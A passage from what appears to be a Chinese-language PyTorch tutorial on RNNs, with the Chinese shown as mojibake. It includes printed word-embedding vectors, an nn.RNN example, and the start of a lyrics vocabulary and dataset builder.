0.12323860824108124, -0.16887104511260986, 0.4024936854839325, -0.3631386458873749, -0.3940415382385254, -0.851615309715271, 0.052415359765291214, 1.0799293518066406, 0.2743575870990753, -0.45772257447242737, -0.02607984095811844] ä½äº -\u0026gt; [1.7168090343475342, -0.08993507921695709, 0.42629849910736084, -0.8526725769042969, 0.17064198851585388, 0.5137831568717957, -0.037155650556087494, -1.1192309856414795, 1.5791795253753662, -0.9378558397293091, -1.1923009157180786, -0.04971752688288689, -1.6210458278656006, -1.2578229904174805, 0.468787282705307, -0.017596535384655, 0.5358322262763977, 1.0883111953735352, 0.6899486184120178, 2.2773444652557373, 0.9163282513618469, -0.7395586371421814, 0.12892921268939972, -1.4885333776474, -0.9551274180412292, -0.4179268479347229, 0.4167310297489166, -0.6567360162734985, -0.7738466858863831, 0.9928999543190002, 0.5239269137382507, -0.37249624729156494, -0.6732262372970581, -2.235102891921997, -1.3211236000061035, -0.5702805519104004, 0.7115850448608398, -0.5283679366111755, -0.9706310033798218, 0.4394710063934326, 1.9765151739120483, 2.844550371170044, 1.3933804035186768, -1.071089506149292, 0.2864969074726105, -0.020159661769866943, -1.0760056972503662, 0.7690610289573669, -0.5425635576248169, -0.12007666379213333, -0.6873587369918823, -1.180539846420288, -0.011916521936655045, 1.1096831560134888, 0.6210238933563232, 0.027135400101542473, 0.3639536499977112, 0.993864893913269, -0.4164225161075592, 0.3271690309047699, 0.40985074639320374, 1.4573488235473633, 0.9820419549942017, 0.5789766907691956, 1.1851555109024048, -1.2971205711364746, 0.33617496490478516, -0.3047017753124237, 0.27652761340141296, -0.9369839429855347, -0.026159269735217094, 0.8137128353118896, -0.015559175983071327, -0.2985958755016327, -2.2304558753967285, -2.1107630729675293, 1.0383832454681396, -1.4547908306121826, -1.2483378648757935, 0.4881366789340973, 0.27501043677330017, -0.7989357113838196, 1.4601446390151978, 1.0553253889083862, 0.17138926684856415, -0.45287197828292847, 1.8369266986846924, 0.19166652858257294, -1.0581374168395996, -0.7617331147193909, 0.6080803871154785, -0.5222128033638, 0.2154778242111206, -0.9145902395248413, -0.6550857424736023, 0.6670337319374084, 0.2841850221157074, 1.5520975589752197, -0.41029027104377747, -0.8780690431594849, 0.6484847664833069, -1.389772653579712, -2.39544415473938, -1.698142409324646, -1.6761640310287476, -0.5713211894035339, 0.5054879188537598, -0.439106822013855, -1.0805776119232178, -1.0738043785095215, -0.22147268056869507, -1.2931756973266602, -1.7447654008865356, -0.2635822296142578, -0.38105618953704834, 0.088524229824543, 0.7569169998168945, -0.7295322418212891, -0.1692301481962204, -1.1889735460281372, 1.8446358442306519, -0.8288096189498901, -1.644872784614563, 0.07178768515586853, 0.9296861886978149, 1.2789150476455688, -0.5919066667556763, -0.14757634699344635] å››å· -\u0026gt; [0.7639459371566772, -0.660054624080658, -0.08635374158620834, -0.41890695691108704, 0.7900705337524414, -0.10140606015920639, 0.4720896780490875, -2.1445083618164062, 0.7043130397796631, -0.8396892547607422, -1.7390351295471191, 0.29287344217300415, -0.2598598599433899, 1.1453543901443481, -1.691605806350708, -0.32984253764152527, -1.0771393775939941, 0.12628982961177826, -1.0895458459854126, 0.6557487845420837, 0.9245684146881104, 0.6992956399917603, 0.2929307520389557, 1.2730282545089722, 0.9517784118652344, 1.6362038850784302, -0.06577905267477036, -0.12625154852867126, -0.21007876098155975, 1.417515754699707, 0.06356274336576462, 0.1672062873840332, -0.14522509276866913, -0.6984828114509583, -0.8967545628547668, 0.6959110498428345, 0.08421899378299713, 0.9785493612289429, -0.4335647225379944, -1.9969183206558228, 2.3934972286224365, 1.669681429862976, -1.094510793685913, 1.2458893060684204, -0.26701512932777405, -1.2686049938201904, -0.7705062031745911, 0.7624711394309998, 0.23258371651172638, -1.6723850965499878, 0.6332679390907288, -0.2207077294588089, -0.8182200789451599, 1.0712546110153198, -0.08216150850057602, 0.11058936268091202, -0.2188360095024109, 2.403790235519409, 0.8505138158798218, -0.29030895233154297, -1.3257994651794434, 0.997616171836853, -0.754666268825531, 0.6795787811279297, -1.4827628135681152, -1.29130220413208, -0.306960791349411, -0.004058618564158678, -1.03386652469635, 0.2599014341831207, 1.5488905906677246, -1.1801602840423584, -0.04927394539117813, 2.0203394889831543, 0.34747564792633057, 0.7936400771141052, -1.9471760988235474, -0.2748616337776184, 0.8032112121582031, -0.97441565990448, 1.0562200546264648, 0.4987774193286896, 1.4722212553024292, 1.2849000692367554, 0.5363295674324036, 2.090388536453247, 0.2972404360771179, 0.6321299076080322, -2.443924903869629, -0.5117645263671875, 0.8579564094543457, -0.7760249376296997, 0.7403879165649414, -0.13470539450645447, -1.7935080528259277, -1.0757124423980713, -0.6320903897285461, 0.7336604595184326, 2.0827550888061523, -1.602760910987854, 0.16270942986011505, -1.0851973295211792, 1.267317771911621, -0.44165411591529846, 1.4766086339950562, -1.5308431386947632, -0.7466219663619995, -0.5175436735153198, 2.3212132453918457, 0.8788610100746155, 0.26752519607543945, 1.0927706956863403, 0.2308245152235031, 2.395909547805786, -1.0620023012161255, -1.5863486528396606, -0.37703272700309753, 0.6864315271377563, 0.5820862650871277, 1.4480952024459839, 0.09708879142999649, 0.34581759572029114, -0.3975397050380707, 1.173356056213379, -0.7262426614761353, -0.4707520306110382, -1.6837925910949707, 0.3518792390823364] æˆéƒ½ -\u0026gt; [0.56243896484375, 1.4777281284332275, 0.4997352063655853, 1.0969278812408447, 0.7628512978553772, 1.7217930555343628, -0.40213480591773987, -0.5143151879310608, -2.4896655082702637, -0.35010015964508057, 2.312429189682007, -0.6234450340270996, 1.5870294570922852, 0.9043256044387817, 0.979636549949646, 2.0384109020233154, -0.01772027090191841, 1.2573158740997314, 1.4020342826843262, 1.0658103227615356, -0.27821195125579834, -1.0903197526931763, 0.40434160828590393, -1.1213923692703247, -0.21690411865711212, -2.405766248703003, 0.2388550341129303, 0.4941626787185669, 0.5749419927597046, -1.6343562602996826, -0.3733586370944977, 0.033875722438097, 1.96085786819458, -0.7303372621536255, 1.248095989227295, 0.05076742544770241, -0.1411282867193222, -0.680297315120697, 2.2530136108398438, -2.905562400817871, 0.028334857895970345, -0.331263929605484, 1.8674354553222656, -0.6284685134887695, 1.0690555572509766, 0.4204407036304474, 1.2775059938430786, 0.20274092257022858, -0.4572921693325043, 1.0441139936447144, -0.04267473891377449, -1.0923773050308228, 2.450409173965454, 0.04830460250377655, 0.07777398079633713, 0.2420053482055664, 0.9271904826164246, -0.6963448524475098, 2.0232656002044678, 0.8172881007194519, -0.5111582279205322, -0.7655945420265198, 2.400362491607666, -2.3128511905670166, -0.49751365184783936, 0.8380289673805237, 0.29281502962112427, -0.2212970107793808, -0.2090066373348236, 1.088941216468811, -1.0725855827331543, -0.07908947765827179, -0.13858187198638916, -0.7048135995864868, -0.18928736448287964, -0.020287740975618362, -1.050644874572754, 0.5913116931915283, 0.006256016902625561, 1.3219653367996216, -0.7687020301818848, 0.14103731513023376, 0.0016240208642557263, -1.2730432748794556, -0.1441194862127304, -0.8608500361442566, -1.0339374542236328, 0.7806683778762817, 0.7678371667861938, -1.5007939338684082, -0.6163219809532166, 0.22171591222286224, 0.6179243922233582, 0.06138891354203224, 1.0564122200012207, 0.6745894551277161, 0.8391706347465515, 0.004445864353328943, -0.5395381450653076, 0.21040350198745728, 0.965447187423706, -0.07339546829462051, 1.7722938060760498, -1.0979887247085571, 0.7095265984535217, -0.22573591768741608, -0.2532839775085449, 0.345893532037735, 0.49645504355430603, -0.22295160591602325, -0.3253420293331146, 0.18388471007347107, -0.7767135500907898, -0.5512225031852722, -0.2734062075614929, -0.15085825324058533, 0.43957316875457764, 1.3614509105682373, 1.2428990602493286, 0.8182045817375183, 0.5461722016334534, -0.41816452145576477, -0.19024881720542908, -0.45834967494010925, -0.6916024088859558, -2.3069822788238525, -2.3388330936431885, 0.294677734375] ï¼Œ -\u0026gt; [-0.33787408471107483, -1.3094017505645752, -0.06432336568832397, -1.0921032428741455, -0.04095187038183212, -0.953260600566864, 1.372378945350647, -0.6234164834022522, 0.861510157585144, -0.2992742359638214, -0.5599021315574646, 0.476374089717865, -2.0908029079437256, -1.0384407043457031, 0.2720696032047272, 1.0667717456817627, 0.07459308952093124, -0.264820396900177, -0.7853105068206787, -0.033309247344732285, 0.2928711771965027, 0.4753778576850891, 0.21960414946079254, -1.3768391609191895, -1.0830707550048828, 0.4983312487602234, 1.9078577756881714, 0.138449564576149, -0.8132482767105103, -0.20288391411304474, -1.36941659450531, 0.1078270897269249, -1.6963082551956177, -0.03481857106089592, -1.0912704467773438, 1.4659584760665894, 0.1895529329776764, -0.33048200607299805, 1.1222764253616333, -0.18429803848266602, -0.9224066138267517, -0.46710413694381714, 0.4822205901145935, -0.4209873080253601, -0.04612121731042862, 1.659363031387329, 1.560346007347107, -0.1867826133966446, 0.2480340152978897, 0.13798049092292786, -0.2595059275627136, 0.6765235662460327, -1.193811058998108, -0.9169279932975769, 1.3021773099899292, -1.1234501600265503, 1.3536704778671265, -1.2806051969528198, 1.3554661273956299, -0.8482236862182617, 0.41685938835144043, 2.065185785293579, 1.1324994564056396, -1.1211353540420532, -0.7691621780395508, 0.11613759398460388, 0.013647863641381264, 2.055845260620117, 1.4118510484695435, -0.19109390676021576, 0.6356171369552612, -0.7232450246810913, -1.6852675676345825, -1.0326565504074097, 0.9595025777816772, 0.5682767629623413, -0.8269544839859009, -0.14660421013832092, -1.7345532178878784, -0.05637021362781525, 1.1968082189559937, 0.04985278844833374, -0.5233662128448486, -0.9858769774436951, 0.33265429735183716, 0.04952392727136612, 0.26295122504234314, -1.0770411491394043, 1.9539353847503662, 0.6972767114639282, -0.6182871460914612, -2.249014139175415, 0.7948842644691467, -0.8970513343811035, -0.7566987872123718, -1.8652397394180298, 0.7252744436264038, -2.2766242027282715, -0.30294767022132874, -2.074877977371216, 1.808603048324585, 2.3689382076263428, -0.07377711683511734, -1.1722602844238281, -0.4107270836830139, 0.7841655015945435, -1.2185114622116089, -0.45550736784935, 1.2937835454940796, 0.2953551709651947, 0.28018659353256226, 1.317701816558838, 0.7412610054016113, 0.9395641684532166, -0.7370730638504028, 0.21863065659999847, 1.6849689483642578, -0.9418413043022156, 1.3929885625839233, -0.6308969855308533, 0.4914607107639313, 0.35774946212768555, 0.14206045866012573, -1.0362331867218018, 2.092369794845581, -1.212904453277588, -0.954627513885498, -0.9904732704162598] æ˜¯ -\u0026gt; [-1.0381309986114502, 0.13718514144420624, 3.8931920528411865, -2.0787062644958496, -0.9909481406211853, 1.2365304231643677, 0.14260700345039368, 0.13479892909526825, 0.30499759316444397, 0.4600023031234741, 1.8234951496124268, 0.6081579327583313, -1.3596107959747314, 0.7735426425933838, 0.4919971227645874, -1.3641643524169922, 1.237881064414978, -0.6730667352676392, -0.9279845952987671, -0.07291223853826523, 0.005679577123373747, 0.822374701499939, -0.9734363555908203, -0.8951475024223328, 0.46311473846435547, 1.8462002277374268, -0.2588288187980652, 0.4701385498046875, 0.9768430590629578, 1.1862082481384277, -0.532867431640625, -2.6098439693450928, 0.16334624588489532, -0.2312006801366806, 0.04538475722074509, 1.5012876987457275, 1.8384860754013062, -0.946250855922699, -0.43893951177597046, 0.17583389580249786, 1.4166406393051147, 0.8954916596412659, 1.554394006729126, -0.6380833983421326, -0.06268838793039322, 1.1698411703109741, -0.4295130670070648, -0.3615911602973938, -0.9524906873703003, 0.41601669788360596, -0.17511416971683502, -0.020355144515633583, -0.5950009226799011, 1.0813703536987305, -0.11183588206768036, -1.2964600324630737, 2.048386573791504, 0.43394115567207336, -0.34899622201919556, -1.2100651264190674, -0.5326148271560669, 0.38617876172065735, -0.986335039138794, -2.582519769668579, 1.3733240365982056, -0.2605557143688202, -0.21359194815158844, 1.6070479154586792, -0.2156515270471573, -0.19509197771549225, -1.6181598901748657, -1.1318364143371582, -0.5061348676681519, 0.25062844157218933, 0.0032534294296056032, -0.25270673632621765, -0.13427601754665375, -0.06254970282316208, 0.4892120659351349, -0.8235657811164856, -0.6076521873474121, -1.3053886890411377, -0.43925970792770386, 1.324268102645874, 0.9528844952583313, -0.47715362906455994, 0.3556428551673889, 0.211994931101799, -0.6904019713401794, -1.3862437009811401, -0.322297602891922, -0.3010545074939728, -0.836707353591919, -1.6331428289413452, -0.30824604630470276, -1.9453868865966797, -1.624407172203064, -0.5701942443847656, 0.03189626336097717, -1.5300270318984985, 0.397626131772995, 0.09802354127168655, 2.5223982334136963, 1.1541708707809448, -1.5273308753967285, -1.4219385385513306, 0.75459223985672, 1.1492969989776611, -0.47371330857276917, 2.405719041824341, -0.9892557859420776, -1.454994797706604, 0.29766565561294556, -0.22816257178783417, 1.8712615966796875, 1.545329213142395, -0.8563598394393921, 1.5104244947433472, -0.29827380180358887, 0.7789028882980347, 0.7176946401596069, -1.2561675310134888, -0.85163414478302, 0.02971484512090683, -0.5711592435836792, 0.4415961503982544, -1.4320781230926514, 0.44245144724845886] ä¸­åäººæ°‘å…±å’Œå›½æ•™è‚²éƒ¨ -\u0026gt; [0.14025051891803741, -0.5883216857910156, 1.056982398033142, 1.398756980895996, 1.2855510711669922, -0.9107669591903687, -1.406931757926941, 0.4232429265975952, 0.138737291097641, 0.41513851284980774, 0.24644315242767334, -1.2017205953598022, 0.6361500024795532, -0.03634294122457504, 0.7052356004714966, 0.6098170876502991, -0.3026246726512909, -1.4279675483703613, 1.588690161705017, 0.6018990278244019, 1.6895304918289185, 0.003920222632586956, 1.4023375511169434, -1.3140830993652344, -0.9500641822814941, -0.18963374197483063, 0.7632401585578918, -2.6280431747436523, -0.6997641324996948, 0.8201631307601929, 1.6689854860305786, -0.005850125104188919, 0.8181517720222473, 0.9020212888717651, 0.9376468062400818, 0.6025412678718567, 0.19286642968654633, -2.0545268058776855, -0.5015175938606262, 0.8119596838951111, 0.518287718296051, 0.7443577647209167, 0.12724363803863525, -0.4288278818130493, -0.5430804491043091, 1.6007821559906006, -1.7710744142532349, 1.045377492904663, -0.13337315618991852, 0.5695350170135498, 0.611879825592041, 0.8327794671058655, -3.0777602195739746, -1.4227104187011719, 1.6461505889892578, -1.138787865638733, -0.5175765156745911, -0.6527858972549438, -0.4465395510196686, 0.019725844264030457, -1.4563722610473633, -0.3762948215007782, 1.2026947736740112, 0.7340081930160522, -0.5348214507102966, -0.7487169504165649, -0.3007497489452362, -1.6888025999069214, 0.7306185364723206, -0.469486266374588, -0.9775107502937317, -0.21138161420822144, 0.7867814898490906, 1.2474416494369507, 0.097927987575531, -0.29573315382003784, 0.023264342918992043, -0.1560763567686081, 0.722339928150177, 0.5893672704696655, -0.024296792224049568, 1.7033941745758057, -0.3186756372451782, -2.038273811340332, 0.2632593512535095, 0.7503422498703003, 0.18595272302627563, -1.7183271646499634, 0.7696282267570496, 0.6995213031768799, -0.3682793080806732, -2.2420945167541504, 0.9661995768547058, 1.4557089805603027, 0.1969800740480423, -0.9218257665634155, -0.5476601719856262, -0.30923694372177124, -0.8398916125297546, 1.4972319602966309, -0.3774861693382263, -0.21029157936573029, 2.224287986755371, 0.2102212756872177, 0.18242454528808594, 0.04718697443604469, 0.2859799861907959, -1.1755571365356445, 0.30829644203186035, -0.0006614835583604872, -0.36983150243759155, 1.4986408948898315, 0.9627066850662231, 1.6044225692749023, 1.7419381141662598, -1.3149410486221313, -1.1165934801101685, 2.3712234497070312, 0.8730128407478333, -1.9619089365005493, -0.07330694049596786, 0.688816487789154, -0.4210284650325775, -0.7613076567649841, -0.1594087779521942, 1.3634997606277466, 1.6164549589157104, 0.3564639687538147] ç›´å± -\u0026gt; [-0.33789971470832825, 1.3584284782409668, -0.5811788439750671, -0.6095796823501587, -0.6302621960639954, -0.6341601014137268, 1.420705795288086, 0.13715553283691406, -2.060513734817505, 1.26814603805542, -0.23949818313121796, 1.1931129693984985, -1.0386868715286255, -0.3954807221889496, 0.5195523500442505, 0.754364550113678, 0.20388828217983246, -0.4023708403110504, -0.02800746262073517, -2.2803475856781006, 1.1303919553756714, -0.5699470639228821, -0.3445722758769989, -1.151837944984436, 0.5616161227226257, -0.07560509443283081, 1.9034521579742432, -0.8097555041313171, 1.5177966356277466, -1.3630318641662598, -0.30350542068481445, 0.39291444420814514, -0.7752071619033813, 1.1337178945541382, 0.5776795744895935, 0.9621323347091675, 0.7165736556053162, -0.7049280405044556, -0.6581589579582214, 2.2558507919311523, 0.6021068692207336, -1.278320074081421, 1.2918076515197754, 0.014823876321315765, -1.7895697355270386, -0.07380425184965134, -0.6859892010688782, -1.3862357139587402, 0.434276819229126, 0.5077678561210632, -0.7565757632255554, 0.7231796383857727, -2.8456947803497314, -0.6417722105979919, 0.189362570643425, -0.839449942111969, 0.5829066634178162, -0.579809308052063, -0.2484005242586136, 0.6170995235443115, -0.9293689727783203, 0.15690799057483673, 0.10465901345014572, -0.22713077068328857, -0.40781092643737793, -0.6484670639038086, -0.09114891290664673, 0.6100202202796936, 0.43622541427612305, -0.31834375858306885, -0.561362087726593, -0.6336369514465332, 1.3107948303222656, 0.8724061250686646, 0.8782907128334045, 0.7980823516845703, -1.503814697265625, 2.432075023651123, -0.39363643527030945, -0.11639916151762009, -0.39047491550445557, 0.3356471657752991, -0.7154036164283752, 0.2089829444885254, -1.274901032447815, -1.2903138399124146, 0.4787827730178833, 0.8754767775535583, -0.36598432064056396, -0.8223683834075928, -0.5764500498771667, 0.5468283295631409, -0.005182052031159401, 2.0755088329315186, -0.20317433774471283, 0.7980713248252869, -0.13998694717884064, 0.845341145992279, -1.0122485160827637, 1.019565224647522, 1.4568798542022705, -1.8541587591171265, -0.08164568245410919, 0.8209619522094727, 0.539742112159729, 1.7721991539001465, 1.7427912950515747, -0.9580423831939697, -1.1708639860153198, -0.07433973252773285, 1.1893250942230225, -0.4009150564670563, -0.5625899434089661, -1.648033618927002, 0.5622848272323608, -1.4640545845031738, -1.2228060960769653, 0.8409449458122253, -0.05045817047357559, -0.7518205642700195, -1.115128517150879, 1.3314285278320312, -0.4583549499511719, -0.22974802553653717, -0.2134741246700287, 1.346194863319397, 0.6285591125488281, 0.04430529847741127] å…¨å›½ -\u0026gt; [-1.5520007610321045, 0.3314692974090576, 0.08914195001125336, -0.0056284223683178425, -0.9564746618270874, -0.40461617708206177, 0.13070593774318695, 1.686263084411621, 1.010897159576416, 0.8405971527099609, 0.15378746390342712, 0.9534083008766174, 0.23421438038349152, 0.08166507631540298, -0.25529566407203674, -0.7175579071044922, 0.4626561999320984, 0.7876096963882446, 0.9008212089538574, 0.3049789071083069, -0.09401117265224457, -1.4717092514038086, 1.6372592449188232, -0.24522098898887634, 0.12768657505512238, -0.580763041973114, -0.4987027049064636, 0.8773986101150513, -0.13349944353103638, -0.08767732232809067, -0.28354188799858093, -0.03146464750170708, 0.40214914083480835, -1.0805237293243408, 1.311383605003357, -1.5334444046020508, 1.6689292192459106, 1.8921211957931519, 0.1684861183166504, 1.2055963277816772, 0.06375385820865631, 0.610754132270813, -1.09141206741333, -0.272737979888916, 0.8392224907875061, -0.9453503489494324, -0.15187454223632812, 0.53958660364151, -0.4521462321281433, -0.44379866123199463, 0.5150322914123535, -0.35866037011146545, 1.8172500133514404, 0.6289143562316895, 0.97475665807724, -0.25434234738349915, -0.18379847705364227, -0.8135579824447632, -0.4091949164867401, 0.14109547436237335, -2.461815118789673, 1.3043322563171387, -2.3017876148223877, -0.6164878606796265, -0.4214482605457306, 0.47513189911842346, -0.7553485035896301, -0.2020123153924942, 0.47444117069244385, 1.2666491270065308, -0.46207693219184875, 1.9876667261123657, -1.7732608318328857, 1.075785756111145, -2.8453588485717773, -0.820521891117096, -0.7866068482398987, 0.8140893578529358, -1.9845681190490723, -0.4685239791870117, -0.06957542151212692, 1.1858913898468018, 0.3000602722167969, -1.6092876195907593, 0.44625040888786316, -0.17546935379505157, -0.9834369421005249, -0.12012048065662384, 2.1486434936523438, -1.6368743181228638, 1.181698203086853, -0.09896392375230789, -0.7479424476623535, 0.8604170083999634, -0.1014096736907959, 0.9558519124984741, -0.21039994060993195, -0.18168802559375763, -1.9284073114395142, 0.02403911016881466, -0.5795352458953857, -0.08818890154361725, -0.08199119567871094, 0.039158958941698074, -0.28986191749572754, -0.81545490026474, 0.8709331154823303, -0.8589040637016296, 1.9099797010421753, 1.0797122716903687, -0.657086193561554, -0.5038485527038574, 1.448275089263916, 0.371888667345047, 1.253653883934021, -1.170638918876648, -1.3922667503356934, -0.6512734293937683, 1.5548454523086548, 0.2577717900276184, 0.4874401390552521, 0.13227622210979462, -0.33626890182495117, 0.6618170142173767, -1.2863892316818237, -0.1770940124988556, -0.7055754065513611, 1.3789422512054443] é‡ç‚¹ -\u0026gt; [1.1949406862258911, -0.012182194739580154, 0.8961377739906311, 0.7839514017105103, -0.18879392743110657, -0.39553102850914, -0.2632424235343933, -0.938086986541748, 1.3489576578140259, -0.4624161422252655, -1.3119703531265259, 0.5095743536949158, 0.1330413520336151, -1.4793245792388916, -1.9383506774902344, 0.20698249340057373, 2.5029187202453613, -0.35258620977401733, 0.5366807579994202, -2.0697383880615234, -1.5056042671203613, -0.8820537328720093, -0.3993379473686218, 0.05287330597639084, 0.7160015106201172, -0.47868359088897705, 0.15337057411670685, -0.6627570390701294, -1.9589228630065918, 0.8543242812156677, -0.48553666472435, 0.2018612027168274, -0.26615840196609497, -1.2309821844100952, 0.051297858357429504, -0.20254108309745789, -0.10170754045248032, -0.5889589786529541, 0.7253758311271667, -0.39362308382987976, -0.568123459815979, -0.06739899516105652, -0.9299246668815613, 0.059613823890686035, -1.1932049989700317, 0.1409657895565033, -1.029586672782898, 1.0887030363082886, -1.1189749240875244, -1.730431318283081, 0.005612374283373356, 0.5359809994697571, 0.6329437494277954, 0.4694022834300995, -1.2981356382369995, 0.5264517068862915, -0.10433857887983322, -0.331701397895813, -0.3174913227558136, -1.4151962995529175, 0.005109786055982113, 0.9603325128555298, -0.3973565399646759, 0.23845700919628143, 1.1231367588043213, -0.44293013215065, -0.6706748008728027, 1.1240535974502563, -0.5034427642822266, -0.5822576284408569, 1.5443520545959473, -1.6841453313827515, 0.06877513229846954, -1.740064024925232, 1.1700929403305054, -0.34096410870552063, 0.0911058783531189, 0.6429353952407837, 0.27809223532676697, -0.7784138321876526, 1.1370183229446411, 0.014460142701864243, -0.28068944811820984, -0.30486515164375305, 0.8224811553955078, -2.0884850025177, -0.7780076861381531, 1.1283482313156128, -0.11650309711694717, 2.2403976917266846, 1.5255331993103027, 0.4878126084804535, -0.811322033405304, 1.0219014883041382, 0.6292736530303955, -1.2825417518615723, 0.7980432510375977, 1.142793893814087, -0.4022769033908844, -1.4298145771026611, 0.9908952713012695, 1.0863277912139893, -0.2719363272190094, -1.0888563394546509, 0.32725587487220764, 0.3708494305610657, -0.09677056968212128, 0.27237048745155334, -0.37364158034324646, 0.030335577204823494, 1.1755188703536987, -0.3344758450984955, 0.47455546259880066, -0.6940397024154663, 0.4407373070716858, -1.0097383260726929, -0.017465421929955482, -0.36444470286369324, -1.780834436416626, 0.11095383763313293, 0.44742828607559204, 0.4113369882106781, 0.8977880477905273, -0.5807644128799438, -0.07540850341320038, 0.47065648436546326, -0.4016966223716736, 0.1848985105752945] å¤§å­¦ -\u0026gt; [-1.4475852251052856, -0.17752867937088013, -0.7879891991615295, 1.2863266468048096, 0.5554264783859253, 0.7422486543655396, 0.647564709186554, -0.4495318830013275, 0.5519548058509827, 0.1076410636305809, -1.4149372577667236, 0.10615064203739166, 0.07769380509853363, -0.8733966946601868, -0.2317454218864441, -0.8407759070396423, -0.6344646215438843, -0.10932822525501251, 0.9894860982894897, 0.518584668636322, 0.12721653282642365, -1.2334426641464233, -0.7602449655532837, -0.1530931144952774, 0.7784685492515564, 0.6280393600463867, -0.34914520382881165, -0.986354649066925, 0.05498924106359482, -0.5254408121109009, -0.15824776887893677, 0.16335463523864746, 0.4538341760635376, -0.08873286098241806, 0.2933367192745209, 0.020767442882061005, -0.8800519704818726, 0.37006673216819763, -0.7811611294746399, -1.2028112411499023, -1.0187177658081055, -0.27793389558792114, 2.092510938644409, 1.4004042148590088, 0.9561623930931091, 0.9958055019378662, -0.9844347238540649, -1.1637202501296997, 0.5800871253013611, -0.6730059385299683, 1.3405460119247437, -0.14193913340568542, 0.8394786715507507, 1.0213227272033691, -0.19199487566947937, -0.69403475522995, -1.3983559608459473, 0.3184455633163452, 0.33800598978996277, 0.9688117504119873, 0.23558557033538818, 1.587860345840454, -1.1090397834777832, -1.1135281324386597, 0.22917072474956512, 0.5204218029975891, 0.8698641061782837, -0.9962738752365112, 0.751709520816803, 0.07302659749984741, -0.5218413472175598, 0.5482472777366638, -0.35429203510284424, -0.20083633065223694, 1.3695396184921265, 1.0042166709899902, 0.4688868820667267, 1.1620533466339111, 2.3771159648895264, 0.8834945559501648, 0.6229496002197266, -0.4971642792224884, -1.3196049928665161, -0.30771127343177795, 0.9008187055587769, 0.5891910195350647, -0.8497917056083679, -0.3938082456588745, -0.3030562996864319, -0.5590260028839111, 0.49924609065055847, -0.42346131801605225, -0.2595711052417755, 0.7297765612602234, -0.3204481899738312, -0.3209802508354187, -1.5807064771652222, 0.7140669822692871, 1.0739787817001343, -0.5437872409820557, -0.810208797454834, 0.5369143486022949, 0.4794268310070038, 0.8579863905906677, -0.5213403105735779, 0.5756368637084961, 1.5243277549743652, 1.427191138267517, 1.70316481590271, 0.6414663791656494, -1.61505126953125, 1.7495568990707397, -0.7892530560493469, 0.7378950119018555, -1.5114903450012207, 0.7335148453712463, -0.6459513902664185, -1.5614869594573975, 0.09263267368078232, -0.19371019303798676, -1.8619593381881714, -0.2190641313791275, -0.62592613697052, 0.7170789837837219, 2.0938637256622314, 0.04755529761314392, 0.8852423429489136, 0.24461376667022705] RNN ç”¨äºå¤„ç†æœ‰åºåˆ—ç‰¹æ€§çš„æ•°æ®ï¼šè¯­è¨€ã€è¯­éŸ³ã€å¤©æ°”ç­‰ å›¾ç¤ºï¼š Pytorchï¼štorch.nn.RNN(input_size,hidden_size,num_layer) input_sizeï¼šè¾“å…¥æ•°æ®çš„ç»´åº¦ï¼Œä¸€èˆ¬ä¸ºè¯å‘é‡çš„ç»´åº¦ hidden_sizeï¼šéšè—å±‚hçš„ç»´åº¦ï¼Œä¹Ÿæ˜¯å½“å‰å±‚ç¥ç»å…ƒè¾“å‡ºçš„ç»´åº¦ num_layerï¼šéšè—å±‚hçš„å±‚æ•°ï¼Œé»˜è®¤ä¸º1 1 2 3 4 5 6 7 8 9 10 11 12 import torch import torch.nn as nn print(words_to_index) # å®šä¹‰RNNï¼Œinput_sizeä¸ºæ¯ä¸ªåˆ†è¯åµŒå…¥åçš„ç»´åº¦ï¼Œhidden_sizeä¸ºRNNéšçŠ¶æ€ç»´åº¦ rnn = nn.RNN(input_size=128,hidden_size=64,num_layers=1) # inputsçš„ç¬¬ä¸€ä¸ªç»´åº¦ä¸ºæ—¶é—´æ­¥æ•°ï¼ˆåˆ†è¯æ•°é‡ï¼‰ï¼Œç¬¬äºŒä¸ªç»´åº¦ä¸ºbatchï¼Œç¬¬ä¸‰ä¸ªç»´åº¦ä¸ºåˆ†è¯åµŒå…¥ç»´åº¦ inputs = embeddings.unsqueeze(0).permute(1,0,2) # h0ç¬¬ä¸€ä¸ªç»´åº¦ä¸ºRNNå±‚æ•°ï¼Œç¬¬äºŒä¸ªç»´åº¦ä¸ºbatchï¼Œç¬¬ä¸‰ä¸ªç»´åº¦ä¸ºæ¯ä¸ªhçš„ç»´åº¦ h0 = torch.zeros(size=(1,1,64)) print(inputs.shape) y,h = rnn(inputs,h0) {'ç”µå­ç§‘æŠ€å¤§å­¦': 0, 'ï¼ˆ': 1, 'UESTC': 2, 'ï¼‰': 3, 'ä½äº': 4, 'å››å·': 5, 'æˆéƒ½': 6, 'ï¼Œ': 7, 'æ˜¯': 8, 'ä¸­åäººæ°‘å…±å’Œå›½æ•™è‚²éƒ¨': 9, 'ç›´å±': 10, 'å…¨å›½': 11, 'é‡ç‚¹': 12, 'å¤§å­¦': 13} torch.Size([14, 1, 128]) è¯è¡¨ç”Ÿæˆ 1 2 3 4 5 6 7 8 9 # å¯¼å…¥å·¥å…·åŒ… import torch import re import jieba import torch.nn as nn import torch.nn.functional as F import torch.optim as optim import time from torch.utils.data import DataLoader D:\\Program\\Anaconda\\envs\\dlab\\lib\\site-packages\\jieba\\_compat.py:18: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools\u0026lt;81. import pkg_resources 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 # åŠ è½½æ•°æ®ï¼Œæ„å»ºè¯è¡¨ def Tokenizer(path = \u0026#34;./Dataset/6_RNN_Zhoujielun/jaychou_lyrics.txt\u0026#34;): all_word_list = [] with open(path,\u0026#34;r\u0026#34;,encoding=\u0026#34;utf-8\u0026#34;) as file: for line in file: if not line: continue # è·³è¿‡ç©ºè¡Œ words = jieba.lcut(line) all_word_list.extend(words) word_list = list(dict.fromkeys(all_word_list)) word_to_index = {word:index for index,word in enumerate(word_list)} index_to_word = {index:word for word,index in word_to_index.items()} all_index = [word_to_index[word] for word in all_word_list] return word_to_index,index_to_word,all_index,len(word_to_index) # æ„å»ºæ•°æ®é›†ç±»ï¼Œæ„å»ºå¯è¿­ä»£å¯¹è±¡ class LyricsDataset(torch.utils.data.Dataset): def __init__(self,all_indix,sent_len): # è¾“å…¥åŸå§‹å­—å…¸å’Œå¥å­é•¿åº¦ super().__init__() self.all_indix = all_indix # å®Œæ•´ç´¢å¼• self.sent_len = sent_len # å¥å­é•¿åº¦ self.word_num = len(all_indix) # åˆ†è¯æ€»æ•° self.sent_num = self.word_num // 